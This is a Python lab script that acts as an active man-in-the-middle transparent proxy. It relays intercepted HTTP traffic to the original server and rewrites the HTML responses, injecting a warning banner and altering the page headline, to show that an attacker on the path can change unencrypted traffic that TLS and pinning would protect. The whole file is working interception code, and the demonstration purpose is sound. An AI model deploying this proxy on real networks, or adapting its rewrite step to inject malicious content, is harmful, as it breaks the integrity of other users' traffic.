#!/usr/bin/env python3
"""Threat 4 (MitM) — ACTIVE on-path modification (integrity break), stdlib only.

Runs INSIDE mitm-interceptor. The interceptor is the client's gateway; an iptables
REDIRECT sends forwarded tcp/80 into this transparent proxy. For each connection the
proxy recovers the ORIGINAL destination (SO_ORIGINAL_DST, so it is not tied to one
target), relays the request to the real server, and REWRITES the HTML response before
returning it to the client — proving an on-path attacker can alter, not just read,
unencrypted traffic. This is the capability that read-only packet capture could not show;
mitmproxy is unpackaged on Debian trixie, so this does it with the standard library.

Defeated by TLS (the proxy cannot read/alter ciphertext) + cert pinning / HSTS
(a substitute certificate fails the client's check) — see README.
"""
import socket, struct, threading, sys, re

LISTEN = ("0.0.0.0", 8080)
SO_ORIGINAL_DST = 80
# Visible tamper: inject a banner and rewrite the Apache default page's headline.
BANNER = b'<div style="background:#c00;color:#fff;padding:8px;font-family:sans-serif">' \
         b'\xe2\x9a\xa0 THIS PAGE WAS MODIFIED IN TRANSIT BY AN ON-PATH ATTACKER</div>'


def original_dst(conn):
    data = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    port = struct.unpack("!H", data[2:4])[0]
    ip = socket.inet_ntoa(data[4:8])
    return ip, port


def recv_http(sock):
    """Read status/headers, then the body per Content-Length (good enough for the lab)."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            return buf, b""
        buf += chunk
    head, _, rest = buf.partition(b"\r\n\r\n")
    m = re.search(rb"[Cc]ontent-[Ll]ength:\s*(\d+)", head)
    body = rest
    if m:
        need = int(m.group(1)) - len(rest)
        while need > 0:
            chunk = sock.recv(65536)
            if not chunk:
                break
            body += chunk
            need -= len(chunk)
    return head, body


def tamper(head, body):
    if b"text/html" not in head.lower():
        return head, body, False
    new = body
    new = new.replace(b"<body>", b"<body>" + BANNER, 1)
    new = re.sub(rb"It works", b"It works (TAMPERED)", new)
    if new == body and BANNER not in new:          # no <body> tag: prepend banner
        new = BANNER + body
    changed = new != body
    # fix Content-Length so the client renders the altered page
    head = re.sub(rb"([Cc]ontent-[Ll]ength:\s*)\d+",
                  (r"\g<1>%d" % len(new)).encode(), head)
    return head, new, changed


def handle(client):
    try:
        ip, port = original_dst(client)
        req, _ = recv_http(client)           # client request (headers; GET has no body)
        if not req:
            return
        upstream = socket.create_connection((ip, port), timeout=10)
        upstream.sendall(req + b"\r\n\r\n")
        head, body = recv_http(upstream)
        upstream.close()
        head, body, changed = tamper(head, body)
        client.sendall(head + b"\r\n\r\n" + body)
        print(f"[mitm] {ip}:{port}  {'TAMPERED' if changed else 'relayed'} "
              f"({len(body)} B)", flush=True)
    except Exception as e:
        print(f"[mitm] error: {e}", file=sys.stderr, flush=True)
    finally:
        client.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(LISTEN)
    srv.listen(64)
    print(f"[mitm] active transparent proxy on {LISTEN[0]}:{LISTEN[1]}", flush=True)
    while True:
        c, _ = srv.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()


if __name__ == "__main__":
    main()
